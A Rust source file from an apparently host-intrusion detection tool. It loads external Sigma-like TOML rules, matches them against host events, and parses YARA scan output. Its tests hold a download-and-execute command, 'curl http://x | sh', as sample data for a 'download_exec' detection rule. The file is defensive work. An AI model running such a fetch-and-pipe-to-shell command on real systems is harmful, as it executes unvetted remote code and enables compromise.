use crate::detectors::{evidence, DetectContext, Detector};
use crate::rules::model::RuleMetadata;
use crate::utils::command::command_output;
use sentinel_core::{Category, Finding, RawEvent, Severity};
use serde::Deserialize;
use std::collections::BTreeMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::time::Duration;
use tracing::warn;

pub struct ExternalRulesDetector;

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(default)]
struct ExternalRuleFile {
    rule: Vec<ExternalRule>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(default)]
struct ExternalRule {
    id: String,
    title: String,
    description: String,
    severity: Severity,
    category: String,
    source: String,
    kind: String,
    field_exists: Vec<String>,
    field_equals: BTreeMap<String, String>,
    field_contains: BTreeMap<String, String>,
    recommendations: Vec<String>,
}

impl Default for ExternalRule {
    fn default() -> Self {
        Self {
            id: String::new(),
            title: String::new(),
            description: String::new(),
            severity: Severity::Medium,
            category: "System".to_string(),
            source: String::new(),
            kind: String::new(),
            field_exists: Vec::new(),
            field_equals: BTreeMap::new(),
            field_contains: BTreeMap::new(),
            recommendations: Vec::new(),
        }
    }
}

impl Detector for ExternalRulesDetector {
    fn name(&self) -> &'static str {
        "external_rules"
    }

    fn rules(&self) -> Vec<RuleMetadata> {
        Vec::new()
    }

    fn detect(&self, events: &[RawEvent], ctx: &DetectContext) -> Vec<Finding> {
        if !ctx.config.external_rules.enabled {
            return Vec::new();
        }
        let mut findings = Vec::new();
        let rules = load_external_rules(&ctx.config.external_rules.sigma_paths);
        for rule in rules {
            if !valid_external_rule(&rule) {
                continue;
            }
            for event in events
                .iter()
                .filter(|event| rule_matches_event(&rule, event))
            {
                findings.push(rule_finding(&rule, event, &ctx.host_id));
            }
        }
        if ctx.config.external_rules.yara_enabled {
            findings.extend(run_yara(&ctx.config, &ctx.host_id));
        }
        findings
    }
}

fn load_external_rules(paths: &[PathBuf]) -> Vec<ExternalRule> {
    paths
        .iter()
        .flat_map(|path| external_rule_files(path))
        .flat_map(|path| match fs::read_to_string(&path) {
            Ok(text) => match toml::from_str::<ExternalRuleFile>(&text) {
                Ok(file) => file.rule,
                Err(err) => {
                    warn!(path = %path.display(), error = %err, "failed to parse external rule file");
                    Vec::new()
                }
            },
            Err(err) => {
                warn!(path = %path.display(), error = %err, "failed to read external rule file");
                Vec::new()
            }
        })
        .collect()
}

fn external_rule_files(path: &Path) -> Vec<PathBuf> {
    if path.is_file() {
        return vec![path.to_path_buf()];
    }
    let Ok(entries) = fs::read_dir(path) else {
        return Vec::new();
    };
    entries
        .flatten()
        .map(|entry| entry.path())
        .filter(|path| path.extension().and_then(|value| value.to_str()) == Some("toml"))
        .collect()
}

fn valid_external_rule(rule: &ExternalRule) -> bool {
    !rule.id.trim().is_empty()
        && (!rule.source.trim().is_empty()
            || !rule.kind.trim().is_empty()
            || !rule.field_exists.is_empty()
            || !rule.field_equals.is_empty()
            || !rule.field_contains.is_empty())
}

fn rule_matches_event(rule: &ExternalRule, event: &RawEvent) -> bool {
    if !rule.source.trim().is_empty() && rule.source != event.source {
        return false;
    }
    if !rule.kind.trim().is_empty() && rule.kind != event.kind {
        return false;
    }
    if rule
        .field_exists
        .iter()
        .any(|key| !event.fields.contains_key(key))
    {
        return false;
    }
    if rule
        .field_equals
        .iter()
        .any(|(key, expected)| event.field(key).unwrap_or("") != expected)
    {
        return false;
    }
    !rule.field_contains.iter().any(|(key, needle)| {
        !event
            .field(key)
            .unwrap_or("")
            .to_ascii_lowercase()
            .contains(&needle.to_ascii_lowercase())
    })
}

fn rule_finding(rule: &ExternalRule, event: &RawEvent, host_id: &str) -> Finding {
    let category = parse_category(&rule.category);
    let title = if rule.title.trim().is_empty() {
        format!("External rule matched: {}", rule.id)
    } else {
        rule.title.clone()
    };
    let description = if rule.description.trim().is_empty() {
        "An external rule matched a collected host event.".to_string()
    } else {
        rule.description.clone()
    };
    let mut evidence_items = vec![
        evidence("external_rule_id", &rule.id),
        evidence("event_source", &event.source),
        evidence("event_kind", &event.kind),
        evidence("event_id", &event.id),
    ];
    for key in rule
        .field_exists
        .iter()
        .chain(rule.field_equals.keys())
        .chain(rule.field_contains.keys())
    {
        if let Some(value) = event.field(key) {
            evidence_items.push(evidence(key, value));
        }
    }
    Finding::new(
        host_id,
        title,
        description,
        rule.severity,
        category,
        format!("EXT-{}", rule.id),
        event
            .field("path")
            .or_else(|| event.field("exe"))
            .or_else(|| event.field("remote_addr"))
            .or_else(|| event.field("ip"))
            .unwrap_or(&event.id),
    )
    .with_evidence(evidence_items)
    .with_recommendations(rule.recommendations.clone())
}

fn run_yara(config: &sentinel_core::SentinelConfig, host_id: &str) -> Vec<Finding> {
    let timeout = Duration::from_secs(config.external_rules.command_timeout_seconds);
    let mut findings = Vec::new();
    for rule_path in &config.external_rules.yara_paths {
        for scan_root in &config.external_rules.yara_scan_roots {
            let rule_arg = rule_path.to_string_lossy().to_string();
            let root_arg = scan_root.to_string_lossy().to_string();
            let Some(output) = command_output(
                &config.external_rules.yara_command,
                &["-r", rule_arg.as_str(), root_arg.as_str()],
                timeout,
            ) else {
                continue;
            };
            if !output.status_success && output.stdout.trim().is_empty() {
                continue;
            }
            findings.extend(parse_yara_output(
                &output.stdout,
                host_id,
                &rule_arg,
                &root_arg,
            ));
        }
    }
    findings
}

fn parse_yara_output(
    output: &str,
    host_id: &str,
    rule_path: &str,
    scan_root: &str,
) -> Vec<Finding> {
    output
        .lines()
        .filter_map(|line| {
            let mut parts = line.split_whitespace();
            let rule_name = parts.next()?;
            let matched_path = parts.next()?;
            Some(
                Finding::new(
                    host_id,
                    format!("YARA rule matched: {rule_name}"),
                    "A YARA rule matched a file in the configured scan roots.",
                    Severity::High,
                    Category::FileIntegrity,
                    format!("YARA-{rule_name}"),
                    matched_path,
                )
                .with_evidence(vec![
                    evidence("yara_rule", rule_name),
                    evidence("yara_rule_path", rule_path),
                    evidence("yara_scan_root", scan_root),
                    evidence("path", matched_path),
                ])
                .with_recommendations(vec![
                    "Inspect the matched file and verify whether the YARA rule is appropriate for this host.".to_string(),
                ]),
            )
        })
        .collect()
}

fn parse_category(value: &str) -> Category {
    match value.trim().to_ascii_lowercase().as_str() {
        "ssh" => Category::Ssh,
        "user" => Category::User,
        "privilege" => Category::Privilege,
        "persistence" => Category::Persistence,
        "process" => Category::Process,
        "network" => Category::Network,
        "fileintegrity" | "file_integrity" | "file" => Category::FileIntegrity,
        "web" => Category::Web,
        "docker" => Category::Docker,
        "rootkit" => Category::Rootkit,
        "configrisk" | "config_risk" => Category::ConfigRisk,
        _ => Category::System,
    }
}

#[cfg(test)]
mod tests {
    use super::{parse_yara_output, rule_matches_event, ExternalRule};
    use sentinel_core::RawEvent;
    use std::collections::BTreeMap;

    #[test]
    fn sigma_like_rule_matches_structured_fields() {
        let mut rule = ExternalRule {
            source: "auditd".to_string(),
            kind: "audit_exec".to_string(),
            field_contains: BTreeMap::from([("argv".to_string(), "curl".to_string())]),
            ..ExternalRule::default()
        };
        rule.id = "download_exec".to_string();
        let event = RawEvent::new("auditd", "audit_exec").with_field("argv", "curl http://x | sh");

        assert!(rule_matches_event(&rule, &event));
    }

    #[test]
    fn parses_yara_cli_output() {
        let findings = parse_yara_output(
            "SuspiciousPHP /var/www/html/a.php\n",
            "host",
            "/etc/vps-sentinel/rules.yar",
            "/var/www",
        );

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "YARA-SuspiciousPHP");
    }
}
